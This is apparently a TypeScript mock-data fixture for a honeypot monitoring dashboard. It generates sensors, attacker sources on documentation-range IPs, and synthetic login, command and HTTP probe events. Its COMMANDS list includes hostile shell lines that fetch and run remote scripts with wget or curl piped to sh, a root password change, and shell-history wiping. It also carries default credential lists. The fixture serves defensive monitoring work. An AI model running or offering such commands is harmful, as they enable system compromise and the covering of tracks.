// Seeded mock fixtures. Attacker addresses come from the RFC 5737
// documentation ranges so mock data never names a real host.
import type {
  AttackSource,
  EventType,
  HoneypotEvent,
  Protocol,
  Sensor,
  SessionUser,
  Severity,
} from '../types'
import { createRng, hex, int, isoMinutesAgo, pick, pickSkewed } from './random'

export const MOCK_USER: SessionUser = {
  name: 'Operator',
  email: 'operator@example.test',
  roles: ['admin'],
}

export const SENSORS: Sensor[] = [
  { id: 'cowrie-vps-01', name: 'cowrie-vps-01', kind: 'Cowrie', protocols: ['ssh', 'telnet'], location: 'Frankfurt, DE', status: 'online', eventsLast24h: 0, lastSeen: isoMinutesAgo(0) },
  { id: 'cowrie-home-01', name: 'cowrie-home-01', kind: 'Cowrie', protocols: ['ssh', 'telnet'], location: 'Home lab', status: 'online', eventsLast24h: 0, lastSeen: isoMinutesAgo(1) },
  { id: 'dionaea-vps-01', name: 'dionaea-vps-01', kind: 'Dionaea', protocols: ['smb', 'ftp', 'mysql', 'sip'], location: 'Frankfurt, DE', status: 'online', eventsLast24h: 0, lastSeen: isoMinutesAgo(2) },
  { id: 'tanner-vps-01', name: 'tanner-vps-01', kind: 'Snare/Tanner', protocols: ['http'], location: 'Frankfurt, DE', status: 'degraded', eventsLast24h: 0, lastSeen: isoMinutesAgo(14) },
  { id: 'rdpy-home-01', name: 'rdpy-home-01', kind: 'RDPY', protocols: ['rdp'], location: 'Home lab', status: 'online', eventsLast24h: 0, lastSeen: isoMinutesAgo(3) },
  { id: 'suricata-vps-01', name: 'suricata-vps-01', kind: 'Suricata', protocols: ['http', 'ssh', 'smb'], location: 'Frankfurt, DE', status: 'offline', eventsLast24h: 0, lastSeen: isoMinutesAgo(190) },
]

const COUNTRIES = ['CN', 'US', 'RU', 'BR', 'IN', 'VN', 'NL', 'DE', 'KR', 'ID', 'IR', 'TW'] as const

const ORGS = [
  ['AS4134', 'Chinanet'],
  ['AS14061', 'DigitalOcean'],
  ['AS16509', 'Amazon'],
  ['AS45090', 'Tencent Cloud'],
  ['AS9009', 'M247'],
  ['AS24940', 'Hetzner'],
  ['AS37963', 'Alibaba Cloud'],
  ['AS200019', 'AlexHost'],
  ['AS4766', 'Korea Telecom'],
  ['AS63949', 'Akamai Linode'],
] as const

const TAGS = ['scanner', 'bruteforce', 'mirai-like', 'cryptominer', 'tor-exit', 'botnet', 'recon'] as const

export const USERNAMES = ['root', 'admin', 'ubuntu', 'user', 'test', 'oracle', 'pi', 'postgres', 'git', 'support', 'guest', 'ftpuser'] as const

export const PASSWORDS = ['123456', 'admin', 'password', 'root', '12345678', 'qwerty', '1234', 'P@ssw0rd', 'raspberry', 'admin123', 'toor', '111111'] as const

export const COMMANDS = [
  'uname -a',
  'cat /proc/cpuinfo | grep name | wc -l',
  'cd /tmp; wget http://198.51.100.23/bins.sh; chmod +x bins.sh; ./bins.sh',
  'echo "root:Xk2j9" | chpasswd',
  'nproc',
  'ls -la ~/.ssh',
  'free -m',
  'crontab -l',
  'curl -s http://203.0.113.9/x | sh',
  'history -c; rm -rf ~/.bash_history',
] as const

const PROTOCOL_WEIGHTS: Protocol[] = ['ssh', 'ssh', 'ssh', 'ssh', 'telnet', 'telnet', 'http', 'http', 'smb', 'rdp', 'ftp', 'mysql', 'sip']

function sensorFor(protocol: Protocol, rng: () => number): Sensor {
  return pick(rng, SENSORS.filter((s) => s.protocols.includes(protocol)))
}

function buildSources(): AttackSource[] {
  const rng = createRng(0xa11a)
  const prefixes = ['192.0.2', '198.51.100', '203.0.113']
  const seen = new Set<string>()
  const sources: AttackSource[] = []
  while (sources.length < 140) {
    const ip = `${pick(rng, prefixes)}.${int(rng, 1, 254)}`
    if (seen.has(ip)) continue
    seen.add(ip)
    const [asn, org] = pickSkewed(rng, ORGS)
    const firstSeen = int(rng, 60, 60 * 24 * 40)
    sources.push({
      ip,
      country: pickSkewed(rng, COUNTRIES),
      asn,
      org,
      events: 0,
      sessions: 0,
      firstSeen: isoMinutesAgo(firstSeen),
      lastSeen: isoMinutesAgo(firstSeen),
      riskScore: int(rng, 5, 99),
      tags: rng() < 0.7 ? [pick(rng, TAGS), ...(rng() < 0.3 ? [pick(rng, TAGS)] : [])] : [],
    })
  }
  return sources
}

function eventShape(
  protocol: Protocol,
  rng: () => number,
): { type: EventType; severity: Severity; username?: string; password?: string; command?: string; summary: string } {
  const roll = rng()
  if ((protocol === 'ssh' || protocol === 'telnet') && roll < 0.62) {
    const username = pickSkewed(rng, USERNAMES)
    const password = pickSkewed(rng, PASSWORDS)
    return { type: 'login.failed', severity: 'low', username, password, summary: `Failed login ${username}/${password}` }
  }
  if ((protocol === 'ssh' || protocol === 'telnet') && roll < 0.7) {
    const username = pickSkewed(rng, USERNAMES)
    const password = pickSkewed(rng, PASSWORDS)
    return { type: 'login.success', severity: 'medium', username, password, summary: `Login accepted ${username}/${password}` }
  }
  if ((protocol === 'ssh' || protocol === 'telnet') && roll < 0.93) {
    const command = pickSkewed(rng, COMMANDS)
    const severity: Severity = /wget|curl|chpasswd|rm -rf/.test(command) ? 'high' : 'medium'
    return { type: 'command.input', severity, command, summary: command }
  }
  if (roll > 0.985) {
    return { type: 'file.download', severity: 'critical', summary: `Payload fetched (sha256 ${hex(rng, 12)}…)` }
  }
  if (protocol === 'http' && roll < 0.8) {
    const path = pick(rng, ['/wp-login.php', '/.env', '/cgi-bin/luci', '/boaform/admin/formLogin', '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'])
    return { type: 'http.request', severity: path.includes('phpunit') ? 'high' : 'low', summary: `GET ${path}` }
  }
  if (roll > 0.9) {
    return { type: 'ids.alert', severity: 'high', summary: pick(rng, ['ET SCAN Suspicious inbound to mySQL port 3306', 'ET EXPLOIT Possible EternalBlue MS17-010', 'ET SCAN Potential SSH Scan']) }
  }
  return { type: 'connection', severity: 'info', summary: `${protocol.toUpperCase()} connection opened` }
}

function buildEvents(sources: AttackSource[]): HoneypotEvent[] {
  const rng = createRng(0xbee5)
  const events: HoneypotEvent[] = []
  // Cowrie-style hex session ids, stable per (source, connection slot).
  const sessionRng = createRng(0x5e55)
  const sessionIds = new Map<string, string>()
  const sessionIdFor = (key: string) => {
    if (!sessionIds.has(key)) sessionIds.set(key, hex(sessionRng, 12))
    return sessionIds.get(key)!
  }
  const count = 1800
  for (let i = 0; i < count; i++) {
    // Denser traffic in recent hours with a mid-window burst.
    const hour = Math.floor(24 * (1 - rng() ** 1.25))
    const burst = rng() < 0.12 ? int(rng, 300, 420) : 0
    const minutesAgo = burst || int(rng, 0, 59) + hour * 60
    const protocol = pick(rng, PROTOCOL_WEIGHTS)
    const source = pickSkewed(rng, sources)
    const shape = eventShape(protocol, rng)
    events.push({
      id: `evt-${hex(rng, 10)}`,
      timestamp: isoMinutesAgo(Math.min(minutesAgo, 24 * 60 - 1)),
      sensor: sensorFor(protocol, rng).id,
      protocol,
      srcIp: source.ip,
      srcPort: int(rng, 1024, 65535),
      country: source.country,
      asn: source.asn,
      sessionId: sessionIdFor(`${source.ip}#${int(rng, 1, 6)}`),
      ...shape,
    })
  }
  events.sort((a, b) => b.timestamp.localeCompare(a.timestamp))

  // Roll per-source and per-sensor counters up from the events so every view
  // of the mock data agrees with every other.
  const bySource = new Map(sources.map((s) => [s.ip, s]))
  const sessions = new Map<string, Set<string>>()
  for (const event of events) {
    const source = bySource.get(event.srcIp)!
    source.events += 1
    if (event.timestamp > source.lastSeen) source.lastSeen = event.timestamp
    if (!sessions.has(source.ip)) sessions.set(source.ip, new Set())
    sessions.get(source.ip)!.add(event.sessionId)
    const sensor = SENSORS.find((s) => s.id === event.sensor)!
    sensor.eventsLast24h += 1
  }
  for (const source of sources) source.sessions = sessions.get(source.ip)?.size ?? 0
  return events
}

export const SOURCES: AttackSource[] = buildSources()
export const EVENTS: HoneypotEvent[] = buildEvents(SOURCES)
